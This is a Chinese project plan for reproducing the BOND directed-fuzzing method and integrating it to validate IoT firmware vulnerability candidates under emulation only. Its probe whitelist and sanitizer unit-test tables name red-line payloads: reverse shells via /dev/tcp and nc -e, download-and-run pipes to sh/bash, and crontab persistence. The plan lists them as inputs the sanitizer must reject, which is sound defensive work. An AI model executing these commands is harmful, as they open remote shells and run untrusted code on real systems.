# H 同学 · BOND 全量复现与集成计划

> **你的任务**：把 BOND（USENIX Sec'26，约束导向定向模糊测试）从"论文"做到
> "能把我们的候选变成可触发证据的验证引擎"。
> **Plan A（原版复现）与 Plan B（mini-BOND 自研）双线并行，Plan B 是主线。**
>
> **基调：不是跑通 demo，是全量完成。** 你的验收标准见 §2 全量档 9 条。
>
> **先说清楚**：你要啃的是四人里风险最高的一个——需要 IDA Pro 7.5 商业授权、
> 没有 GitHub 只有 Zenodo artifact、论文尚未正式发表、原论文在真机上打黑盒（我们不能）。
> **但这恰恰是四人里最有价值的一个**：它补的是我们从"疑似"到"确认"之间那段空白。
> 现在 `skills/06-dynamic-validation` 只定义了 L0–L3 分层和安全门，**没有任何真正的验证实现**。你来填。

---

## 1. 三句话讲清 BOND

- **它解决什么**：静态污点分析产出大量报告但缺乏验证。BOND 用"约束引导的定向模糊测试"，把污点报告（source / sink / call trace）变成**真实可触发的 PoC**。
- **它补我们什么**：我们的候选到 `confirmed-issue` 之间**缺一整段**。现在只能靠人工 10 问，答不了"它真的能触发吗"。
- **它在链条哪**：`CONSTRAINED_VALIDATION` 阶段，只吃经 KLEE 剪枝后**存活**的高价值候选。

### 1.1 论文的四个机制（答辩要讲清楚）

1. **入口点识别**：在 CFG/CG 上**后向遍历**找隐藏的调度结构（如 `websFormDefine("SetWan", func)`），提取关键字，圈出可达区域。
2. **多维约束提取**：过程间数据流跟踪，把路径约束分三类（**强制 / 部分 / 无约束**），映射为六种高级语义类型。
3. **LLM 模板生成**：LLM 分析 CVE 报告/PoC 推断 HTTP 请求结构（Method / 入口关键字位置 / 参数格式），保证请求不被前端直接拦截。
4. **优先级变异**：按约束优先级变异（先满足强制约束），降维打击深层漏洞。

论文数据：2776 份污点报告验证出 1349 个真漏洞、155 个 0day（108 个 CVE/PSV）；
60 个已知漏洞召回率 **91.67%**；比主流 IoT fuzzer（GreenHouse / FIRM-AFL / SNIPUZZ / BooFuzz）高 **5.5 倍**；
消融实验显示：仅基础变异召回率 15%，加约束分析后从 23 个涨到 82 个（82%），加优先级变异后到 93% 且耗时降 70%。

---

## 2. 交付标准（三档）

### 全量档（Full）—— 你的目标

| # | 项 | 具体判定 |
|---|---|---|
| **F1** 数据集全量 | L1 合成 + L2 DIR-859 + L3 两个真实固件，**全部在仿真环境中跑过** | 3 份验证报告 |
| **F2** 模式全量 | **Plan A 与 Plan B 都走到明确结论**：Plan A 要么跑通要么给出"缺什么"的清单；Plan B 全量实现并跑通 | 两份结论文档 |
| **F3** Parser 全量 | 覆盖：BooFuzz 会话日志、`fuzz_log/fuzz_sent_log.txt`、crash 证据、marker 证据、约束分析结果、入口点识别结果 | 六类都有 fixture |
| **F4** 单测全量 | **脱敏器单测覆盖全部红线 payload**；约束提取单测；parser 六类分支；覆盖率 ≥80% | `pytest --cov` |
| **F5** 接入全量 | registry 注册 + `run_external.py --tool bond` 可跑 + `--depth full` 下 `CONSTRAINED_VALIDATION` 跑通 | 三条都通 |
| **F6** Benchmark 全量 | 3 固件 × Top-5 候选的**触发率（Confirm Uplift）** + 平均触发耗时 | `benchmarks/external/bond/comparison.md` |
| **F7** 降级完备 | BOND 缺失/超时一律不改分只记 limitation；**目标非私有网段必须 `unsafe` 中止且零外发**；8 种开关组合不 abort | 8/8 通过 |
| **F8** 文档全量 | SKILL.md 含 7 节 + 踩坑表 + **Plan A/B 对比 + 安全约束说明** | 文档齐 |
| **F9** 性能基线 | 每候选的 fuzz 耗时、请求数、触发耗时、仿真环境开销 | 基线表 |

### 你的独有交付

| # | 项 | 说明 |
|---|---|---|
| **X1** | **`sanitize.py` PoC 脱敏器** | 全组共用（F 的 `poc_info` 也要走它）。**合规硬闸门** |
| **X2** | **mini-BOND 三模块** | `ghidra_export.py` + `constraint.py` + `template.py`，纯自研 |

### 部分档 / 兜底档

- **部分**：只跑通 Plan B 的单个模块（如只做了约束提取没做 fuzz）；或只跑 L1 合成固件。
- **兜底**：复现报告（含 Plan A 的"缺什么"清单，这份清单本身很有价值）+ Skill 文档 + adapter 空壳 + **脱敏器单测**（脱敏器务必做完，全组依赖）。

---

## 3. 工具档案（已查证）

| 项 | 内容 |
|---|---|
| 全称 | Constraint-Directed Fuzzing for Automated Validation of Taint Analysis Results |
| 论文 | **USENIX Security 2026**（已录用，prepub） |
| 产物 | **Zenodo artifact `10.5281/zenodo.17921159`**（CC BY）。**没有 GitHub 仓库** |
| 依赖 | Python 3.7、**Java 8 (1.8.0_202)**、npm 10.8.2、**IDA Pro 7.5**、patched angr（EmTaint）+ patched BooFuzz（在 `third_party/`） |
| 配置 | `run_para.py`（设备凭据/IP）、`dataflow.conf`（IDA 引擎路径） |
| 命令 | `python Bond.py -f "DIR816_1.10CNB05" -b "goahead"` |
| 输出 | `Bond_result/action_find/`（入口点）、`custom_analysis/`（路径约束）、`fuzz_log/fuzz_sent_log.txt`（PoC） |
| 输入 | 固件二进制 + **污点分析报告**（source / sink / call traces） |

### 3.1 Plan A 的风险清单（你要在 8/30 18:00 前给出结论）

| # | 风险 | 判定问题 |
|---|---|---|
| A1 | **IDA Pro 7.5 商业授权** | 学校/实验室能不能拿到？**今天必须问清楚** |
| A2 | 无 GitHub，只有 Zenodo | artifact 是否完整？`third_party/` 的 patched 库在不在？ |
| A3 | patched angr / patched BooFuzz | 需要我们替换掉已装的库，**会不会污染现有环境**？（建议：独立 venv 或容器） |
| A4 | Python 3.7 + Java 8 老环境 | 与现代依赖冲突能否解决？ |
| A5 | 原论文打**真实设备** | 我们**不能**这么做（安全红线），只能打仿真 |

---

## 4. Plan B：mini-BOND（你的主线，全量实现）

> **核心判断**：论文真正的贡献不是 IDA，而是「**约束提取 → 优先级变异**」这个方法论。
> 我们有 Ghidra、有自己的 `candidates.json`、有 LLM 运行时。**方法论是论文的，实现是我们的。**

### 4.1 组件替换表

| 原版组件 | mini-BOND 替代 | 说明 |
|---|---|---|
| IDA Pro 7.5 的 CFG/CG | **Ghidra headless 脚本导出** CFG/CG/函数表/字符串 | E 已经在 SaTC 轨装了 Ghidra，**直接复用，别重跑** |
| EmTaint（patched angr）的污点报告 | **我们自己的 `candidates.json` + SaTC 结果** | 归一化成 `source/sink/call_trace`，格式已由契约定好 |
| BooFuzz（patched 变异逻辑） | **官方 BooFuzz + 外层约束优先级调度** | **不改 BooFuzz 源码**，把约束翻译成"变异种子生成规则"，规避 patched 库地狱 |
| LLM 生成 HTTP 模板 | **`fsa/runtime/openai_compatible.py`**（国内备案模型） | 现成能力，写 prompt 模板即可 |
| 真实设备黑盒 | **QEMU system / FirmAE 仿真实例，私有网段** | 合规。复用 `tools/emulation/` 已有封装 |

### 4.2 三个模块设计

#### M1 · `ghidra_export.py`（入口点识别 + 可达区域）

```python
def export_cfg_cg(binary: Path, out_json: Path) -> dict:
    """Ghidra headless 导出：函数表 / 调用图 / 每个函数的 CFG 基本块 / 字符串表 / 交叉引用。"""
```

**入口点识别（后向遍历）**：
1. 从 `sink.addr` 出发，沿调用图**反向**找调用者
2. 找调度结构特征：字符串交叉引用里形如 `websFormDefine("Xxx", func)` / `nvram_set` / `goform/xxx` 的模式
3. 提取入口关键字（字符串参数）→ `entry_point.params`
4. 圈定可达区域：正向从入口到 sink 的函数集合

**产出**：
```json
{
  "binary": "sbin/httpd",
  "entry_points": [{"keyword": "SetWan", "func": "0x40a1b0", "type": "websFormDefine"}],
  "reachable_region": ["0x40a1b0", "0x40b220", "..."],
  "sink_refs": [{"addr": "0x40c318", "func": "strcpy"}]
}
```

#### M2 · `constraint.py`（约束提取 + 优先级）

**三类约束**（论文定义）：

| 类 | 含义 | 例子（论文 Fig.1） | 变异优先级 |
|---|---|---|---|
| **mandatory** | 不满足则请求根本到不了 sink | `v0==null && v1~v6!=null`、`load(v1)=="1"`、`deref(v2)=="General"` | **最高，先满足** |
| **partial** | 满足能到达更深的分支 | `deref(v4)=="Yes"` | 次高 |
| **none** | 不影响的路径（如直接进 printf） | `v5->printf` | 最低，随机变异 |

**六种语义类型**（前四种对应论文，后两种是我们为 IoT 场景补的，**要注明**）：

| 语义 | 含义 | 例子 |
|---|---|---|
| `string_eq` | 字符串相等 | `deref(v2)=="General"` |
| `numeric_range` | 数值范围 | `atoi(v3)∈(0,1500]` |
| `null_check` | 空/非空 | `v0==null && v1~v6!=null` |
| `byte_check` | 字节级校验 | 特定偏移的字节值 |
| `length_bound` | 长度界（**我们补充**） | 从栈帧 buffer 大小推断 |
| `net_format` | 网络格式（**我们补充**） | IP / MAC / URL 格式 |

**产出**（直接对应 `external_finding.constraints[]`）：
```json
"constraints": [
  {"param": "Save",  "semantic": "string_eq",     "expr": "=='1'",      "klass": "mandatory"},
  {"param": "Mode",  "semantic": "string_eq",     "expr": "=='General'","klass": "mandatory"},
  {"param": "MTU",   "semantic": "numeric_range", "expr": "(0,1500]",   "klass": "mandatory"},
  {"param": "STATIC","semantic": "string_eq",     "expr": "=='Yes'",    "klass": "partial"},
  {"param": "Server","semantic": "net_format",    "expr": "ipv4",       "klass": "none"}
]
```

#### M3 · `template.py`（LLM 生成 HTTP 模板）

走 `fsa/runtime/openai_compatible.py`，**禁止 curl/wget**。

Prompt 结构（照论文 Fig. 的 system prompt 思路）：
```
你是 IoT 漏洞分诊专家。给定目标固件的入口点与参数信息，推断 HTTP 请求结构：
- http method (GET/POST)
- entry point location (url/body)
- entry point prefix (string/null)
- param format (key-value/JSON/XML/custom)
```

**兜底**：LLM 不可用或返回不合规时，退回规则模板（从 `attack_surface.json` 的 route/handler 拼）。
**不许因为 LLM 挂了就整个模块失败**。

### 4.3 fuzz 调度（外层约束优先级）

```python
def generate_seeds(constraints):
    """按 klass 优先级生成变异种子：
       1) 先给所有 mandatory 参数赋满足约束的值（求解语义类型）
       2) partial 参数在若干变体中轮流满足/不满足
       3) none 参数随机
    """
```

**关键**：不改 BooFuzz 源码。我们只在外层生成"种子请求序列"，交给 BooFuzz 做会话管理。

### 4.4 探针白名单（与 `skills/06-dynamic-validation` 一致）

| 允许 | 禁止 |
|---|---|
| `touch /tmp/lab_marker` | 反弹 shell（`nc -e` / `bash -i` / `/dev/tcp`） |
| `echo LAB > /tmp/lab_marker.txt` | 持久化（`crontab` / 写 `init.d`） |
| `id` / `uname` | 下载执行（`wget|sh` / `curl|bash`） |
| — | 任何破坏性命令 |

---

## 5. ⚠ 安全硬约束（违反即打回）

1. **`target` 只允许 `emulation`**。代码层硬断言：目标 IP 不在 `192.168.0.0/16` / `10.0.0.0/8` / `172.16.0.0/12` 内 → **立即 `status="unsafe"` 并中止，零外发流量**。复用 `tools/emulation/safety_gate.py` 的四道门。
2. **禁止用 `curl` / `wget` 调 LLM**（`config/safety.yaml` 已拉黑）。走 `fsa/runtime/openai_compatible.py`。
3. **PoC 必须过 `sanitize.py` 且 `poc_sanitized == true` 才许落盘/进报告**。
4. 工作目录锁在 `./tmp/external/bond/<run_id>/`。

### 5.1 `sanitize.py` 脱敏规则（X1，全组依赖）

| 内容 | 处理 |
|---|---|
| 真实 IP / 域名 | → `<DEVICE_IP>` / `<HOST>` |
| 反弹 shell | → **整条拒绝**，记录 `rejected_payload`，报告只写"存在命令执行原语，PoC 已按合规策略省略" |
| 下载执行 | → 同上 |
| 持久化写入 | → 同上 |
| 超长溢出串 | → 截断为 `A×N（N=10000）` |
| 无害标记（`touch /tmp/lab_marker`、`id`、`echo LAB`） | ✅ 允许原样保留 |

```python
def sanitize_poc(raw: str) -> tuple[str, bool]:
    """返回 (脱敏后文本, poc_sanitized)。命中任意红线 → 返回 (摘要, True) 但不含原始 payload。"""
```

**单测必须覆盖全部红线 payload**（这是 F4 的硬要求，一条都不能漏）。

---

## 6. 逐日排期（8/30 13:00 起）

### 8/30（半天 + 晚上）—— Plan A 定性 + Plan B 起步

| 时间 | 任务 | 产出 |
|---|---|---|
| 13:00–14:00 | 读 `README.md` §3 共享契约 | — |
| **14:00–16:00** | **Plan A 定性（最高优先级）**：下 Zenodo artifact，`git`-free 检查完整性；**同时去问 IDA Pro 授权** | **完整性检查报告** |
| **16:00–18:00** | **给出 Plan A 的明确结论**：能跑 / 缺什么（写清单） | **`benchmarks/external/bond/plan_a_assessment.md`** ⚠ 18:00 死线 |
| 18:00–19:00 | 装 mini-BOND 环境：Ghidra（复用 E 的）、BooFuzz、QEMU/FirmAE | 环境就位 |
| 19:00–22:00 | 写 `sanitize.py` + 单测（**全组依赖，优先做**） | 脱敏器可用 |
| 22:00–24:00 | 起仿真环境：把 L1 合成固件的 httpd 跑在 QEMU 上，确认能收到 HTTP 响应 | 仿真环境通 |
| 21:00 | 四人同步会（**会上报 Plan A 结论**） | — |

**今日硬产出**：Plan A 结论文档 + `sanitize.py`（含全红线单测）+ 仿真环境能对 L1 固件发请求。

> ⚠️ **Plan A 的 IDA 问题今天必须问到答案**。拿不到就**立刻全力转 Plan B**，不要再花时间。

### 8/31 —— Plan B 模块全量实现

| 时间 | 任务 |
|---|---|
| 09:00–12:00 | **M1 `ghidra_export.py`**：导出 CFG/CG + 入口点后向遍历 |
| 12:00–15:00 | **M2 `constraint.py`**：三类约束 × 六种语义提取 |
| 15:00–18:00 | **M3 `template.py`**：LLM 模板 + 规则兜底 |
| 18:00–21:00 | fuzz 调度层：BooFuzz 会话 + 约束优先级种子生成 |
| 21:00–23:00 | **对 L1 合成固件跑通第一遍**（有 ground truth：已知 `QUERY_STRING → system` 可触发） |

**今日硬产出**：mini-BOND 三模块可用；L1 合成固件跑通并触发。

### 9/1 —— Parser + 单测日

| 时间 | 任务 |
|---|---|
| 09:00–11:00 | 写 `runner.py`：wsl/local 后端 + **仿真环境目标校验**（私有网段断言） |
| 11:00–15:00 | 写 `parser.py`：六类产物解析 |
| 15:00–18:00 | 单测：脱敏器（全红线）、约束提取、parser 六类分支 |
| 18:00–20:00 | **安全门单测**：公网 IP / 未授权 / 无基线三种情形均 `unsafe` 且零外发 |
| 20:00–21:00 | `pytest --cov` ≥80% |

### 9/2 —— 接入 + 联调日（⚠ 18:00 熔断）

| 时间 | 任务 |
|---|---|
| 09:00–11:00 | registry 声明；`run_external.py --tool bond` 跑通 |
| 11:00–13:00 | 与 G 对接：消费 KLEE 判 `reachable=true` 的候选（**这是你的输入源**） |
| 13:00–16:00 | `CONSTRAINED_VALIDATION` 阶段接入；`--depth full` 全链路跑通 |
| 16:00–17:00 | 8 种开关组合降级测试 |
| 17:00–18:00 | 把 `sanitize.py` 交付给 F（他的 `poc_info` 要用） |
| **18:00** | **熔断评审**：按 §2 三档给自己定档 |

### 9/3 —— 量化 + 文档日

| 时间 | 任务 |
|---|---|
| 09:00–15:00 | 3 固件 × Top-5 候选的触发实验，统计 **Confirm Uplift** 与平均触发耗时 |
| 15:00–18:00 | 写 `benchmarks/external/bond/comparison.md`（含 **Plan A 评估**） |
| 18:00–20:00 | 写 `skills/08-external-analyzers/bond/SKILL.md`（7 节 + 踩坑表 + Plan A/B 对比 + 安全约束） |

### 9/4 —— 冻结 + 演示日

- 代码冻结
- **演示素材（全场最强）**：「KLEE 证明可达 → BOND 触发 → 报告判定 confirmed-issue」完整闭环
- 答辩 Q&A 预案（见 §9）

---

## 7. 代码骨架

### 7.1 文件清单（你负责）

```
tools/external/bond/__init__.py
tools/external/bond/runner.py               # BondAnalyzer(ExternalAnalyzer)
tools/external/bond/parser.py               # 六类产物 → external_finding
tools/external/bond/sanitize.py             # ★ X1：PoC 脱敏（全组依赖）
tools/external/bond/mini/__init__.py
tools/external/bond/mini/ghidra_export.py   # ★ X2-M1：入口点 + 可达区域
tools/external/bond/mini/constraint.py      # ★ X2-M2：三类约束 × 六种语义
tools/external/bond/mini/template.py        # ★ X2-M3：LLM HTTP 模板 + 规则兜底
tools/external/bond/mini/scheduler.py       # 约束优先级种子生成
tools/external/bond/fixtures/raw/
tools/registry/external.yaml                # bond 那几行
config/dev.yaml                             # external.bond 段
tests/unit/test_external_bond.py
tests/unit/test_sanitize.py                 # ★ 全红线覆盖
tests/unit/test_constraint.py
skills/08-external-analyzers/bond/SKILL.md
benchmarks/external/bond/{README.md,comparison.md,plan_a_assessment.md,raw/}
docs/external/H-BOND.md
```

### 7.2 parser.py 映射表

| BOND 产出 | 内容 | 映射到 |
|---|---|---|
| `action_find/` | 入口点识别结果 | `entry_point`（method/path/params） |
| `custom_analysis/` | 路径约束分析 | `constraints[]`（param/semantic/expr/klass） |
| `fuzz_log/fuzz_sent_log.txt` | 发送的请求序列 | `evidence`（哪些请求发出去了） |
| crash 证据 | 目标进程崩溃 / 重启 | `validation.triggered=true`、`probe="crash"` |
| marker 证据 | `/tmp/lab_marker` 出现 | `validation.triggered=true`、`probe="marker"` |
| 无响应 / 超时 | 未触发 | `validation.triggered=false`、`probe="none"` |

**关键字段**：
```json
"validation": {
  "triggered": true,
  "probe": "marker",
  "poc_sanitized": true
}
```

`poc_sanitized` 为 `false` 的条目**一律不许落盘**（代码层过滤 + 单测断言）。

### 7.3 与 G 的接口（11:00–13:00 对接）

G 会给你 `symex.reachable=true` 且带 `witness_input` 的候选。
你**优先消费这批**（KLEE 已经替你筛过一轮）。

---

## 8. 单测清单

### 8.1 `test_sanitize.py`（全红线，一条都不能漏）

| payload 类型 | 断言 |
|---|---|
| `bash -i >& /dev/tcp/1.2.3.4/4444` | 被拒绝，输出不含原始 payload |
| `nc -e /bin/sh 1.2.3.4 4444` | 被拒绝 |
| `wget http://x/s.sh \| sh` | 被拒绝 |
| `curl http://x/s.sh \| bash` | 被拒绝 |
| 写 `crontab` / `init.d` | 被拒绝 |
| 真实 IP `192.168.1.1` | → `<DEVICE_IP>` |
| `A×10000` 溢出串 | → `A×N（N=10000）` |
| `touch /tmp/lab_marker` | ✅ 原样保留 |
| `id` / `echo LAB` | ✅ 原样保留 |
| 正常文本 | 不变 |

### 8.2 `test_constraint.py`

| 用例 | 断言 |
|---|---|
| `deref(v2)=="General"` | 解析为 `string_eq` + `mandatory` |
| `atoi(v3)∈(0,1500]` | 解析为 `numeric_range` |
| `v0==null && v1!=null` | 解析为 `null_check` |
| 无约束参数 | `klass="none"` |
| 优先级排序 | mandatory 先于 partial 先于 none |

### 8.3 `test_external_bond.py`（parser 六类分支）

正常 / 空日志 / 畸形日志 / 超时 / 无触发 / 版本差异。

### 8.4 安全门单测（**必须有**）

```python
def test_public_ip_target_aborts():
    """目标 IP 为公网 → status='unsafe' 且零外发流量"""

def test_unauthorized_aborts(): ...
def test_no_baseline_aborts(): ...
```

**CI 约束**：单测绝不调用真实 BOND / 真实网络。

---

## 9. 答辩 Q&A 预案（**你最需要准备充分**）

**Q：BOND 要 IDA Pro，你们有授权吗？**
A：没有商业授权。所以我们第一天就并行做了 **mini-BOND**：Ghidra headless 替 IDA 导出 CFG/CG、
我们自己的 `candidates.json` 替 EmTaint 的污点报告、官方 BooFuzz + 外层约束优先级调度替 patched 库、
QEMU/FirmAE 仿真替真机。**论文的四个机制（入口点识别、可达区域划分、约束提取、优先级变异）我们全实现了，
只是换掉了底层依赖。** 我们还出了一份 Plan A 的缺口清单，说明原版 artifact 缺什么。

**Q：那你们复现的还算 BOND 吗？**
A：复现的是**方法论**不是二进制。论文的消融实验证明，价值来自"约束分析"模块（召回率 15% → 82%），
而不是来自 IDA。我们把这一层完整实现了，并且把它接进了我们自己的候选体系——**反而比原版更贴合我们的系统**，
因为它直接消费我们的输出，形成闭环。

**Q：论文是在真设备上打的，你们怎么做？**
A：**我们不做**。这违反我们的安全红线（《详细计划》第二十六条：不对真实设备、公网或未授权目标做主动测试）。
我们的 `target` 配置项只允许 `emulation`，代码层硬断言目标 IP 必须在私有网段，
否则直接 `unsafe` 中止、零外发流量。三种违规情形都有单测覆盖。

**Q：PoC 进报告会不会有合规问题？**
A：不会。所有 PoC 必须过 `sanitize.py`，真实 IP 脱敏为占位符，
反弹 shell / 下载执行 / 持久化 payload **整条拒绝**，只允许无害标记（`touch /tmp/lab_marker`、`id`）。
`poc_sanitized == false` 的条目一律不许落盘，这一条已纳入报告合规扫描。

**Q：如果 fuzz 没触发是不是说明没有漏洞？**
A：**不是**。我们的规则是"**只降级不否决**"：未触发只写 `decisive_missing_fact = "constrained fuzzing did not trigger; needs manual review"`，
裁决动作是 `NEED_DYNAMIC` 而不是 `REJECT`。fuzz 没触发 ≠ 没有洞。

---

## 10. 踩坑预案

| 坑 | 症状 | 处理 |
|---|---|---|
| **IDA 拿不到** | Plan A 直接卡死 | **8/30 18:00 死线**，拿不到立刻全力转 Plan B |
| Zenodo artifact 缺件 | `third_party/` 里的 patched 库不在 | 记进 `plan_a_assessment.md`，这份清单本身有价值 |
| Python 3.7 / Java 8 老环境 | 与现代依赖冲突 | Plan A 用独立 venv 或容器隔离，**别污染现有环境**；Plan B 无此问题 |
| **BooFuzz 请求被前端直接丢弃** | 全部请求返回 404/400 | 这正是论文要解决的问题——**模板必须对**（method/入口关键字位置/参数格式）。先手工构造一个能通的请求做基线，再让 fuzz 在其上变异 |
| 仿真环境起不来 | QEMU/FirmAE 跑不起固件 | 复用 `tools/emulation/` 已有封装和 `06-dynamic-validation` 的三大坑（br0 ioctl、/dev/nvram、假监听）；起不来就记 limitation，**降级为 skipped 而不是失败** |
| LLM 模板不可用 | 模型超时/返回不合规 | **必须有规则兜底**（从 `attack_surface.json` 拼）。模块不许因 LLM 挂掉而整体失败 |
| 约束提取不准 | 全判成 `none`，等于没约束 | 优先保证 **mandatory 的 null_check 和 string_eq**（这两个最容易提且影响最大）；`numeric_range` 可后置 |
| 目标 IP 被判非私有 | 安全门拦截 | **这是正确行为**，检查仿真网络配置（NAT + host-only），不要去改安全策略 |

---

## 11. 每日 checklist

- [ ] 今天的 fuzz 日志落盘了？
- [ ] **所有 PoC 都过脱敏了吗？**（每天查一次，这是红线）
- [ ] 目标 IP 一直在私有网段吗？
- [ ] LLM 挂掉时规则兜底还生效吗？（每天验一次）
- [ ] 每候选的 fuzz 耗时/请求数记了？（F9）
- [ ] `enabled: false` 时主链还能跑？
- [ ] 有没有卡超过 4 小时没说？

---

*你填的是这个系统最后一块空白：从"疑似"到"确认"。*
*风险最高，但闭环一旦跑通，这就是全场最有说服力的一段演示。*
